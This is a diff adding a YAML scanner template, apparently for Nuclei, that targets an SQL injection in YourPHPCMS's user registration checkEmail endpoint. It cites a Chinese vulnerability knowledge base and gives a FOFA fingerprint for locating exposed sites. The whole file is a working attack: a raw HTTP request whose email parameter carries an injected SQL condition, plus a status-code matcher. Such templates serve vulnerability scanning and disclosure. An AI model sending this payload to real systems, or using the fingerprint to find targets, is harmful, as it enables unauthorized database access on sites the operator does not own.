@@ -1,0 +1,27 @@
+id: poc-rzn0gxdogl30u65a
+info:
+  name: YourPHPCMS系统Register_checkEmail存在sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rzn0gxdogl30u65a'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rzn0gxdogl30u65a
+    fofa: header="YP_onlineid"
+http:
+- raw:
+  - 'GET /index.php?g=User&m=Register&a=checkEmail&userid=1&email=-69710348@nwcrb.com''+or+''1''=''2" HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Accept-Encoding: gzip, deflate, br, zstd'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
